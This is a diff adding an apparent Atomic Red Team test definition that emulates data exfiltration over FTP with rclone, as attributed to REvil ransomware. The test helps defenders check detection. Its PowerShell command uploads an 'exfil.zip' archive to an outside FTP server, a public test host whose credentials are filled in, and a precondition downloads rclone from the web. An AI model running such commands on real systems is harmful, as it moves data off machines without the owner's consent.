@@ -1,0 +1,57 @@
+{
+    "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
+    "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server. [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1048.003",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
+    "arguments": {
+        "ftp_server": {
+            "description": "Your own ftp server",
+            "type": "string",
+            "default": "ftp.dlptest.com"
+        },
+        "ftp_pass": {
+            "description": "Your FTP user's password",
+            "type": "string",
+            "default": "rNrKYTX9g7z3RgJRmxWuGHbeu"
+        },
+        "ftp_user": {
+            "description": "Your FTP username",
+            "type": "string",
+            "default": "dlpuser"
+        },
+        "ftp_port": {
+            "description": "Your FTP's port",
+            "type": "integer",
+            "default": 21
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Check if the exfil package exists\n",
+            "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"
+        },
+        {
+            "description": "Check if rclone zip exists",
+            "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
